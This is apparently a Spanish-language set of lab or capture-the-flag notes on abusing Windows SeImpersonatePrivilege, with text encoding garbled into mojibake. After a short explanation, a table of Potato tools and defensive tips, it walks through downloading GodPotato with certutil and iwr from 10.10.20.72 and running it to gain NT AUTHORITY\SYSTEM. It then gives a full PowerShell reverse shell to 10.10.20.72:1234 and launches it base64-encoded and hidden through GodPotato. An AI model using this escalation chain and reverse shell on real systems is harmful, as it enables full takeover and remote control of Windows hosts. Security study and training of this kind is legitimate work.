## âœ… Â¿QuÃ© es **SeImpersonatePrivilege**?

Es un privilegio de Windows que permite a un proceso **suplantar el token de seguridad de otro usuario autenticado**.

### ðŸ” Â¿QuÃ© implica?
- Adoptar temporalmente la identidad y permisos de otro usuario.
- Ejecutar acciones como si fueras esa cuenta.
- Funciona solo si el proceso obtiene primero un token vÃ¡lido.

### âš ï¸ Â¿Por quÃ© es importante en seguridad?
- Es comÃºn en servicios y aplicaciones legÃ­timas.
- Si un atacante consigue un token de SYSTEM o administrador,
  **puede escalar privilegios fÃ¡cilmente**.
- No otorga permisos por sÃ­ mismo, pero habilita la suplantaciÃ³n.

### ðŸ§© Idea clave
> *El riesgo no es tener el privilegio, sino la posibilidad de capturar un token privilegiado.*

### âœ… Buenas prÃ¡cticas defensivas
- Ejecutar servicios con mÃ­nimos privilegios.
- Restringir accesos remotos y llamadas COM/DCOM.
- Mantener el sistema actualizado.
## ðŸ”§ Herramientas para abusar de **SeImpersonatePrivilege** segÃºn versiÃ³n de Windows

### ðŸŸ¡ Windows 7 / Windows 8 / Server 2008â€“2012
- **RottenPotato**
- **JuicyPotato**
- **HotPotato**

âœ… Funcionan porque aÃºn existÃ­an vectores DCOM/NTLM sin mitigar.

---

### ðŸ”µ Windows 10 (hasta 1809) / Server 2016
- **JuicyPotato**
- **RoguePotato**

âœ… Microsoft empezÃ³ a cerrar rutas, pero seguÃ­an siendo explotables.

---

### ðŸ”µ Windows 10 (1809â€“1909) / Server 2019
- **PrintSpoofer**

âœ… Aprovechaba el servicio Print Spooler â†’ despuÃ©s parcheado.

---

### ðŸŸ¢ Windows 10/11 actuales / Server 2019â€“2022
- **GodPotato**
- **PotatoNG**
- ExplotaciÃ³n manual vÃ­a tokens, named pipes, servicios mal configurados

âœ… Herramientas mÃ¡s modernas porque los mÃ©todos clÃ¡sicos ya no funcionan.

---

## ðŸ“Œ Idea general
- El privilegio **sigue existiendo en todas las versiones**, pero  
  **las tÃ©cnicas cambian conforme Windows parchea vectores antiguos**.

## âœ… RecomendaciÃ³n defensiva
- Mantener parches al dÃ­a
- Minimizar servicios con SeImpersonatePrivilege
- Revisar configuraciones de tokens y permisos de servicios


``` powershell
PS C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
```

``` powershell
PS C:\Windows\system32> PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

``` shell
S C:\tmp> certutil -urlcache -f http://10.10.20.72/GodPotato-NET4.exe GodPotato-NET4.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\tmp> ls


    Directory: C:\tmp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        11/21/2025   7:50 PM          57344 GodPotato-NET4.exe                                                   
```

```shell

PS C:\tmp> iwr -UseBasicParsing http://10.10.20.72/GodPotato-NET4.exe -OutFile GodPotato.exe
PS C:\tmp> ls


    Directory: C:\tmp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        11/21/2025   7:50 PM          57344 GodPotato-NET4.exe                                                   
-a----        11/21/2025   7:51 PM          57344 GodPotato.exe  
```


```bash
PS C:\tmp> ./GodPotato-NET4.exe -cmd "whoami"
[*] CombaseModule: 0x140707796353024
[*] DispatchTable: 0x140707798939976
[*] UseProtseqFunction: 0x140707798234688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\dea72edc-5b58-4457-84f1-10c6de8422b2\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00006402-1248-ffff-943d-80af739d543e
[*] DCOM obj OXID: 0x77845ab3a0263f32
[*] DCOM obj OID: 0x58b0ddb59d14133d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 920 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4656
nt authority\system
```


reverse shell para obtener el ntauthority system

``` bash
â”€â”€(adrts)â”€(kaliã‰¿kali)-[~/machines/adrts/exploits]
â””â”€$ cat rev.ps1                                  
$client = New-Object System.Net.Sockets.TCPClient('10.10.20.72',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

``` bash
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMgAwAC4ANwAyACcALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA
```

```bash 
PS C:\tmp> ./GodPotato-NET4.exe -cmd "powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMgAwAC4ANwAyACcALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA"
```






